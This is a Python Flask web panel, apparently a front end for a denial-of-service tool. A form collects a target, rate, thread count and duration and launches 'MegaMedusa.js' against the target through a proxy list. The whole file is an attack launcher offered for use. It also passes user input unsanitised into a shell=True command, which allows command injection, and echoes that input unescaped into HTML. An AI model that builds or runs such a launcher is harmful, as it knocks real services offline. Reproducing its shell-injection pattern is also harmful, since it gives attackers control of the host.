from flask import Flask, render_template, request
import subprocess
import os
import random

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    target = request.form['target']
    rate = request.form['rate']
    thread = request.form['thread']
    time = request.form['time']

    medusa_path = os.path.join(os.getcwd(), "MegaMedusav32")
    command = f'cd {medusa_path} && node MegaMedusa.js "{target}" {time} {rate} {thread} proxy.txt'

    subprocess.Popen(command, shell=True)

    return f"""
    <h2 style='color:red; font-family:monospace; text-align:center;'>
        Target: {target}<br>
        Time: {time}<br>
        Rate: {rate}<br>
        Thread: {thread}
    </h2>
    <div style='text-align:center;'>
        <a href='/' style='color:red;'>Back</a>
    </div>
    """

if __name__ == '__main__':
    ports = random.sample(range(4000, 9001), 50)
    random_port = random.choice(ports)
    app.run(host='0.0.0.0', port=random_port)
